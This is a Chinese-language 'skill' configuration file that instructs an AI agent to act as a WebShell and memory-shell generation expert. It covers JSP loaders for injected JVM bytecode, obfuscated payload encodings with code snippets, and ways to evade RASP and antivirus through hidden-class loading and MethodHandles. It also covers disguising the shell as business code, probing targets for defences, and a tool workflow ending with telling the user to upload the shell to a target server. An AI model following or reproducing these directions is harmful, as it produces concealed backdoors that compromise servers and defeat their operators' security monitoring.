---
name: shell-obfuscation
description: Shell 混淆与免杀——教 AI 理解 WebShell/内存马工作原理，在生成 payload 时自主应用字符串加密、类加载规避、反射规避、控制流混淆、环境探测等混淆策略
scope: platform
enabled: true
---

# Shell 混淆与免杀 Skill

你是 WebShell/内存马生成与混淆专家。在调用 `ShellGeneratorTools` 生成 payload 前后，主动应用以下知识。

---

## 一、核心原理

WebShell JSP 文件是一个**一次性加载器 + 持久通信桥**。整个 JSP 只需要遵守两个不变量，其余全是可变量：

### 不变量 1：LeoCore 字节码进入 JVM
首次请求时，通过任意方式将编码后的字节码加载为 JVM 类：
- `ClassLoader.defineClass`（标准）
- `MethodHandles.Lookup.defineHiddenClass`（JDK 15+）
- `Unsafe.defineAnonymousClass`（JDK 8-14）
- `URLClassLoader` 从内存中加载
- 任何能把 `byte[]` 变成 Class 的路径

### 不变量 2：密文能来回传递
已加载的 LeoCore 实例重载了 `equals(Object)` 方法作为通信入口：
```java
Class.forName("伪装类名").newInstance().equals(byteArrayOutputStream);
```
- `equals()` 接收请求体密文 → 内部解密 → 解析命令 → 执行 → 加密结果 → 回写到同一 `ByteArrayOutputStream`
- `response.getOutputStream().write(...)` 原样输出
- 类名、方法名、传递方式均可任意变化

### 可变量（每次生成都可以完全不同）
- 类名、方法名、变量名
- 控制流结构（线性 / do-while / switch-case / try-catch 嵌套）
- 字节码编码方式（Base64 / Base36 / 整数数组 / XOR 字节数组）
- 压缩方式（GZIP / 无压缩）
- 加载路径（反射 / Unsafe / MethodHandle / defineHiddenClass）
- 异常处理结构（try-catch-finally 的分支逻辑）
- import 语句数量和编排
- scriptlet 排版（`<% %>` / `<%! %>` 混用比例）
- 注释内容（中文/英文业务注释、变更记录）
- 外层业务代码厚度（多层参数校验、假数据查询）

只要遵守两个不变量，JSP 代码骨架可以变成任何形态。LLM 在生成时无需记忆固定模板，只需理解"变什么都可以，不变两个点"。这是所有变异技术的基础。

### 内存马注入流程
1. 构建核心通信类字节码（LeoCore），配置协议和加解密
2. 选择注入器模板（Tomcat Filter/Servlet/Valve、Jetty Handler、Spring Controller/Interceptor）
3. 打包器将注入器 + 字节码组装为可交付格式（JSP 模板、表达式注入、反序列化链）
4. payload 被目标执行 → 注入器运行 → 注册 Shell 类到容器 → 无文件后门生效

### 关键占位符
- `{{base64Str}}`：注入器字节码的 Base64，必须保留，只能出现一次
- `{{className}}`：注入器类全限定名
- `{{VAR:name}}`：同名渲染为同一随机字段名
- `{{CLS:Name}}`：同名渲染为同一随机 PascalCase 类名

---

## 二、Payload 编码

不要在 JSP 中出现明文或标准 Base64 编码的字节码。

**方式 A：Base36 编码（区别于标准 Base64）**
```java
String cls = "22e8j7dwjq5hh8eo...";  // BigInteger 的 36 进制表示
byte[] clsBytes = new BigInteger(cls, 36).toByteArray();
if (clsBytes[0] == 0) {
    byte[] tmp = new byte[clsBytes.length - 1];
    System.arraycopy(clsBytes, 1, tmp, 0, tmp.length);
    clsBytes = tmp;
}
```
Base36 不在杀软特征库里，且首字节需要 strip（BigInteger 会补符号位 0x00）。

**方式 B：XOR 字节数组解码**
```java
byte[] d = new byte[]{...};
for (int i = 0; i < d.length; i++) d[i] ^= 0x5A;
String s = new String(d);
```

**方式 C：整数数组重建**
```java
char[] c = new char[]{...};
for (int i = 0; i < c.length; i++) c[i] ^= key;
```

**方式 D：StringBuilder 拼接片段**
```java
String s = new StringBuilder().append("java.").append("util.").append("Base64").toString();
```

每次生成随机选择编码方式，key 值随机，且编码后的数据段可再经过 GZIP 压缩增加一层变换。

---

## 三、类加载规避

RASP 重点 Hook `ClassLoader.defineClass`。根据 JDK 版本选择策略：

| JDK 版本 | 推荐方式 | 说明 |
|---------|---------|------|
| JDK 8-14 | `Unsafe.defineAnonymousClass` | 不走 ClassLoader 链 |
| JDK 15+ | `MethodHandles.Lookup.defineHiddenClass` | 隐藏类，RASP 通常不覆盖 |
| 任一版本 | 反射 defineClass + 噪声包装 | 在调用前后加无害操作掩蔽 |

优先用 `defineHiddenClass`（JDK 15+），fallback 到反射 defineClass。

---

## 四、反射规避

RASP Hook `Method.invoke` + `setAccessible(true)`。

- 优先用 `MethodHandle` / `VarHandle` 替代 `java.lang.reflect.Method`
- 用 `MethodHandles.privateLookupIn()` 替代 `getDeclaredMethod()` + `setAccessible()`
- 如必须用反射，将调用点包装在看似正常的业务逻辑中

---

## 五、控制流混淆

- 用 `do { ... } while(false)` 包裹核心逻辑
- 加永不执行但看起来可达的 `if (System.currentTimeMillis() < 0) { ... }` 分支
- 把解码/注入逻辑拆到多个 private 方法中，调用链非显式
- 方法间通过参数传递而非直接调用，打乱调用图

---

## 六、业务伪装

生成的 JSP 文件应看起来像正常业务代码：

- 使用业务相关命名：`DataExportServlet`、`LogQueryHandler`、`ConfigCache`
- 禁止出现：`shell`、`cmd`、`exec`、`inject`、`payload`、`hack`
- 添加真实感的业务注释（功能说明、变更记录、作者）
- 将核心逻辑隐藏在多层正常的参数校验之后
- 触发条件使用密码学验证（HMAC/SHA256 校验），不是简单的 `if (password.equals("admin123"))`

---

## 七、环境探测

生成 payload 前，先确认目标环境：

1. 调用 `getPuppetShellConfig(puppetId)` 获取通信协议和伪装器配置
2. 如有条件，通过命令执行检测目标 JVM 是否有 RASP Agent（检查 `-javaagent:` 参数、已知的 RASP 类名）
3. 检测到 RASP 后优先用容器内部 API 注入（Tomcat Valve、Jetty 内部 Handler），而非标准 Servlet API

---

## 八、生成工作流

### WebShell 生成（推荐：AI 自主封装）

这是最灵活的路径——AI 拿到原始 LeoCore 字节码后，根据免杀原则自行构建 JSP 加载器：

1. `getPuppetShellConfig(puppetId)` → 获取 protocol、reqDisguiseId、respDisguiseId
2. `generateCoreClassBytes(reqDisguiseId, respDisguiseId, protocol, coreClassName)` → 获取 Base36 + GZIP 编码后的 payload 字符串和 coreClassName
3. **AI 自行生成 JSP 加载器代码**，将 encodedPayload 硬编码在 `CONFIG_BLOCK` 中，coreClassName 作为 `resolveClassName()` 的返回值
4. 加载器代码根据本 skill 的原则进行免杀包装（业务伪装、控制流混淆、字符串拆分、编码方式变异等）
5. 将生成的完整 JSP 代码作为代码块输出，并在末尾提示用户：将代码保存为 `.jsp` 文件上传至目标服务器

JSP 解码方式（与 `generateCoreClassBytes` 的编码对应）：
```java
byte[] raw = new BigInteger(encodedPayload, 36).toByteArray();
if (raw[0] == 0x00) { /* strip sign byte */ }
GZIPInputStream gz = new GZIPInputStream(new ByteArrayInputStream(raw));
// read gz → byte[] classBytes → defineClass
```

### WebShell 生成（备选：模板变异路径）

当不需要完全自主封装时，使用模板变异路径：

1. `getShellGeneratorMeta()` → 确认参数范围
2. `getPuppetShellConfig(puppetId)` → 获取协议和伪装器
3. `mutateJspTemplate(packerType, byPassJavaModule, mutationHint)` → AI 变异 JSP 模板
4. `generateWebShell(...)` → 生成最终 payload
5. 回复中包含 `[[shell-result:resultId:取回代码]]`

### 内存马生成

1. `getShellGeneratorMeta()` → 确认可用的 serverType、shellType、packerType
2. `getPuppetShellConfig(puppetId)` → 获取协议和伪装器
3. （可选）`mutateJspTemplate(packerType, byPassJavaModule, mutationHint)` → AI 变异 JSP 模板
4. `generateMemoryShell(...)` → 生成最终 payload
5. 回复中包含 `[[shell-result:resultId:取回代码]]`

在 `mutationHint` 中指定需要的变异方向，如：
- `"字符串 XOR 编码，defineHiddenClass 注入，控制流平坦化"`
- `"业务伪装为日志查询，HMAC 触发，多方法拆分"`
- `"Unsafe 加载，整数数组解码，虚假分支"`

---

## 九、不同场景的策略

| 场景 | 变异策略 |
|------|---------|
| 静态查杀为主 | 字符串全加密 + 业务伪装 + 多方法拆分 + 虚假注释 |
| RASP 环境 | defineHiddenClass + MethodHandle + 容器内部 API + 探针检测 |
| 严格 AV+EDR | 字符串加密 + 控制流平坦化 + 延迟加载 + 分阶段注入 |
| 快速验证连通性 | 基础混淆即可，不需要全套免杀 |
